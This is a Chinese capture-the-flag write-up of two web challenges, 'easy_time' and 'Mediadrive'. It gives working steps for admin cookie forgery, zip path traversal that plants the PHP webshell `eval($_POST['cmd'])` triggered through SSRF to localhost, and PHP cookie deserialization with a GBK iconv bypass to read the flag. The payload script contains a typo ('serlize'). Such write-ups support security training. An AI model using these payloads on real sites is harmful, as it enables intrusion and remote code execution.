# easy_time

## 登录逻辑与漏洞点

在 `index.py` 中：

```python
def is_logged_in() -> bool:
    return flask.request.cookies.get("visited") == "yes" and bool(flask.request.cookies.get("user"))


def home():
    if is_logged_in():
        return flask.redirect(flask.url_for("dashboard"))
    return flask.redirect(flask.url_for("login"))
```

如果登录成功，会跳转`/dashboard`。

### 登录接口

```python
def login():
    if flask.request.method == 'POST':
        username = flask.request.form.get('username', '')
        password = flask.request.form.get('password', '')

        h1 = hashlib.md5(password.encode('utf-8')).hexdigest()
        h2 = hashlib.md5(h1.encode('utf-8')).hexdigest()
        next_url = flask.request.args.get("next") or flask.url_for("dashboard")

        if username == 'admin' and h2 == "7022cd14c42ff272619d6beacdc9ffde":
            resp = flask.make_response(flask.redirect(next_url))
            resp.set_cookie('visited', 'yes', httponly=True, samesite='Lax')
            resp.set_cookie('user', username, httponly=True, samesite='Lax')
            return resp
```

密码原文为 `secret`（`md5(md5('secret'))`）。

有条件时可直接写入 cookie：
- visited=yes
- user=admin

跳转 `/dashboard`，进入管理员界面，功能如下：

1. 上传 zip 并解压
2. ...
3. ...
4. about 页面存在 SSRF 漏洞

## ZIP 上传与路径穿越

```python
def upload_plugin():
    if flask.request.method == 'GET':
        return flask.render_template('plugin_upload.html', error=None, ok=None, files=None)

    file = flask.request.files.get('plugin')
    if not file or not file.filename:
        return flask.render_template('plugin_upload.html', error='请选择一个 zip 文件', ok=None, files=None), 400

    filename = secure_filename(file.filename)
    if not filename.lower().endswith('.zip'):
        return flask.render_template('plugin_upload.html', error='仅支持 .zip 文件', ok=None, files=None), 400

    saved = UPLOAD_DIR / f"{uuid4().hex}-{filename}"
    file.save(saved)

    dest = PLUGIN_DIR / f"{Path(filename).stem}-{uuid4().hex[:8]}"
    dest.mkdir(parents=True, exist_ok=True)

    try:
        print(saved, dest)
        extracted = safe_upload(saved, dest)
    except Exception:
        shutil.rmtree(dest, ignore_errors=True)
        return flask.render_template('plugin_upload.html', error='解压失败：压缩包内容不合法', ok=None, files=None), 400

    return flask.render_template('plugin_upload.html', error=None, ok='上传并解压成功', files=extracted)
```

漏洞点：仅检测后缀 `.zip`，不检查压缩包内部路径，可路径穿越覆盖任意文件，比如 `shell.php`。

## About 页面 SSRF

```python
if flask.request.method == 'POST':
    about_text = flask.request.form.get('about', '')
    avatar_url = flask.request.form.get('avatar_url', '')

return flask.render_template(
    'about.html',
    user=user,
    about=current['about'],
    avatar_local=current['avatar_local'],
    avatar_url=current['avatar_url'],
    remote_info=fetch_remote_avatar_info(current['avatar_url']),
    error=None,
)
```

`avatar_url` 由用户控制，直接请求 `fetch_remote_avatar_info()`，存在 SSRF。

可结合路径穿越与 SSRF 做本地 RCE：

- 通过 ZIP 上传 `<?php eval($_POST['cmd']);?>` 到可访问路径
- SSRF 请求：`http://127.0.0.1/easy_time/shell.php?cmd=dir`

---

# Mediadrive

序列化相关漏洞题目。

```php
if (isset($_COOKIE['user'])) {
    $user = @unserialize($_COOKIE['user']);
}
if (!$user instanceof User) {
    $user = new User("guest");
    setcookie("user", serialize($user), time() + 86400, "/");
}
```

`User` 类：

```php
<?php
declare(strict_types=1);

class User {
    public string $name = "guest";
    public string $encoding = "UTF-8";
    public string $basePath = "/var/www/html/uploads/";

    public function __construct(string $name = "guest") {
        $this->name = $name;
    }
}
```

初始 cookie 由 `user.php` 生成。

上传文件可预览，关键逻辑：

```php
$rawPath = $user->basePath . $f;

if (preg_match('/flag|\/flag|\.\.|php:|data:|expect:/i', $rawPath)) {
    http_response_code(403);
    echo "Access denied";
    exit;
}

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);
if ($convertedPath === false || $convertedPath === "") {
    http_response_code(500);
    echo "Conversion failed";
    exit;
}

$content = @file_get_contents($convertedPath);

$convertedPath = @iconv($user->encoding, "UTF-8//IGNORE", $rawPath);

$rawPath = $user->basePath . $f;
```

漏洞点：
- `basePath` 可由序列化对象注入，public 属性可被修改。
- `iconv` 可用 `GBK` 等编码绕过正则匹配，构造路径如 `fl%FFag` 读取 flag。

思路：
'''
<?php
declare(strict_types=1);

class User {
    public string $name = "guest";
    public string $encoding = "GBK";
    public string $basePath = "/";

    public function __construct(string $name = "guest") {
        $this->name = $name;
    }
}
$u = new User();

$payload=urlencode(serlize($u));

'''

- `User` 中 `encoding="GBK"`, `basePath='/'`。
- 序列化后写入 cookie：`user=...`。
- 访问 `?f=fl%FFag` 可得到 flag。
